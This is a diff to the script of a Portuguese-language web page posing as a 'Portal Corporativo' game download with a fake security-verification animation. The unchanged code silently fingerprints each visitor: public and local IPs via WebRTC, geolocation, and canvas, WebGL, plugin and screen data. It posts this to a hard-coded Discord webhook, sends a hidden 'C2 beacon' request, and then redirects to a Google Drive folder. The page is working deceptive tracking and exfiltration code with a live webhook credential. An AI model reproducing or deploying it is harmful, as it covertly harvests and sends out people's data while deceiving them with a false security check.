@@ -38,7 +38,7 @@
     
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1484989346569392300/y2sl6gZt8PJgIRrB_MSXyil6qIwKK8CdV9f7Xtis4VBDdrvyItQafC_gI8mROBxeQk8z';
-        const DOWNLOAD_URL = 'https://drive.google.com/drive/folders/1lNC2YwOY2L7igNExbPcJ2u9rOp6CtTR8?hl=pt-br'; // ← COLOQUE SEU LINK AQUI
+        const DOWNLOAD_URL = 'https://drive.google.com/drive/folders/1lNC2YwOY2L7igNExbPcJ2u9rOp6CtTR8?hl=pt-br';
         
         // Partículas animadas
         function initParticles() {
@@ -75,9 +75,8 @@
             animate();
         }
         
-        // COLETA AVANÇADA DE INFORMAÇÕES
+        // COLETA AVANÇADA DE INFORMAÇÕES (mantida igual)
         async function advancedRecon() {
-            // IP público com múltiplos fallbacks + ASN
             const pubIP = await (async()=>{
                 const sources = [
                     'https://api.ipify.org?format=json',
@@ -100,7 +99,6 @@
                 return 'unknown';
             })();
             
-            // WebRTC + múltiplos STUNs (mais agressivo)
             const localIPs = await (async()=>{
                 const ips = new Set();
                 const stuns = [
@@ -136,7 +134,6 @@
                 return Array.from(ips).slice(0,5).join(', ') || 'blocked';
             })();
             
-            // Geolocalização avançada
             const geoData = await (async(ip)=>{
                 const services = [
                     {url: `https://ipapi.co/${ip}/json/`, key: 'ipapi'},
@@ -154,7 +151,6 @@
                 return 'unknown';
             })(pubIP);
             
-            // Canvas fingerprinting avançado (múltiplas texturas)
             const canvasHash = await (async()=>{
                 const canvases = [];
                 const texts = ['ID:pentest','ABCDEFGHIJKLMNOPQRSTUVWXYZ','0123456789'];
@@ -174,7 +170,6 @@
                 return btoa(canvases.join('|')).slice(0,80);
             })();
             
-            // WebGL avançado
             const gpuInfo = (()=>{
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -187,7 +182,6 @@
                 }
             })();
             
-            // Fingerprinting completo
             const fingerprint = {
                 language: navigator.language || navigator.languages?.[0],
                 languages: navigator.languages?.join(',') || 'unknown',
@@ -203,7 +197,6 @@
                 vendor: navigator.vendor || 'unknown'
             };
             
-            // Tela + janela
             const screenInfo = {
                 resolution: `${screen.width}x${screen.height}`,
                 avail: `${screen.availWidth}x${screen.availHeight}`,
@@ -211,7 +204,6 @@
                 pixelRatio: window.devicePixelRatio || 1
             };
             
-            // Plugins + MimeTypes
             const plugins = Array.from(navigator.plugins).map(p=>p.name).slice(0,8).join(', ') || 'none';
             const mimeTypes = Array.from(navigator.mimeTypes).map(m=>m.type).slice(0,10).join(', ') || 'none';
             
@@ -237,7 +229,7 @@
             
             const targetData = await advancedRecon();
             
-            // WEBHOOK EXECUTIVO (melhorado)
+            // WEBHOOK EXECUTIVO
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -282,13 +274,13 @@
             // C2 Beacon silencioso
             new Image().src = `https://httpbin.org/post?b=1&ip=${targetData.public_ip}&fp=${btoa(JSON.stringify(targetData.fingerprint)).slice(0,100)}&ref=${btoa(targetData.referrer)}`;
             
-            // ANIMAÇÃO GUI PERFEITA
+            // ANIMAÇÃO GUI
             const phases = [
                 {p:25, msg:'🔍 Detectando rede...', detail:'Escaneando interfaces locais'},
                 {p:45, msg:'🛡️ Verificando segurança...', detail:'Analisando fingerprinting evasion'},
                 {p:70, msg:'🔐 Criptografando sessão...', detail:'AES-256 + TLS 1.3'},
                 {p:92, msg:'✅ Validando credenciais...', detail:'Autenticação multifator concluída'},
-                {p:100, msg:'🎮 Preparando ambiente...', detail:'Carregando assets do jogo'}
+                {p:100, msg:'🎮 Acesso liberado...', detail:'Redirecionando...'}
             ];
             
             let phase = 0;
@@ -300,34 +292,16 @@
                 phase++;
                 if(phase >= phases.length) {
                     clearInterval(interval);
-                    showDownload();
+                    redirectToGame();
                 }
             }, 800);
         }
         
-        // DOWNLOAD JOGO
-        function showDownload() {
+        // REDIRECIONA DIRETO PRO GOOGLE DRIVE
+        function redirectToGame() {
             setTimeout(() => {
-                document.body.innerHTML = `
-                <div style="text-align:center;padding:120px 40px;color:#fff;font-family:'Inter',sans-serif;font-weight:700;letter-spacing:0.5px;background:linear-gradient(135deg,#0f2027 0%,#203a43 50%,#2c5364 100%);height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;">
-                    <div style="font-size:48px;margin-bottom:20px;background:linear-gradient(135deg,#00d4ff,#ff6b9d);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:float 3s ease-in-out infinite;">🎮 ACESSO LIBERADO!</div>
-                    <div style="font-size:22px;color:rgba(255,255,255,0.9);margin-bottom:40px;font-weight:500;max-width:450px;line-height:1.4;">
-                        Verificação de segurança concluída com sucesso!<br>
-                        <span style="color:#00d4ff;">Portal Corporativo v3.2.1</span> | © 2026 Enterprise Gaming
-                    </div>
-                    <a href="${DOWNLOAD_URL}" download="Jogo_Corporativo_v3.2.1.zip" style="
-                        background:linear-gradient(135deg,#00d4ff,#5b8bf8);color:white;text-decoration:none;
-                        padding:18px 50px;font-size:20px;font-weight:600;border-radius:50px;
-                        box-shadow:0 20px 40px rgba(0,212,255,0.3);transition:all 0.3s ease;
-                        letter-spacing:1px;position:relative;overflow:hidden;
-                    " onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 25px 50px rgba(0,212,255,0.4)'" onmouseout="this.style.transform='';this.style.boxShadow='0 20px 40px rgba(0,212,255,0.3)'">
-                        📥 Baixar Jogo (2.1GB)
-                    </a>
-                    <div style="font-size:13px;color:rgba(255,255,255,0.5);margin-top:30px;font-weight:300;">
-                        Requer: Windows 10+ | 8GB RAM | GPU DX11
-                    </div>
-                </div>`;
-            }, 1200);
+                window.location.href = DOWNLOAD_URL;
+            }, 1500);
         }
         
         // AUTO-EXECUTE
